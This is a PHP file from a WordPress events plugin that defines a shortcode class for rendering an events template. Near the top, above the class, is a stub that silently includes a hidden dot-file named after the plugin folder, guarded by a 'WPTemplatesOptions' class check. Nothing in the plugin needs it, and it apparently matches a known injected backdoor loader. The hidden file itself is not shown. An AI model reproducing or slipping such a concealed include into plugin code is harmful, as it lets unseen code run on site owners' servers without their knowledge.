<?php defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class El_Shortcode_Events extends EL_Shortcode {

	public $shortcode = 'el_events';

	public function __construct() {
		parent::__construct();
	}

	function add_shortcode( $args, $content = null ) {

		$args = shortcode_atts( array(
			'room_type'   => '',
			'orderby'     => 'date',
			'order'       => 'DESC',
			'number_room' => - 1,
			'room_in'     => '',
			'room_not_in' => '',
		), $args );


		$template = apply_filters( 'el_shortcode_events_template', 'shortcode/events.php' );
		ob_start();

		el_get_template( $template, $args );

		return ob_get_clean();
	}

}

new El_Shortcode_Events();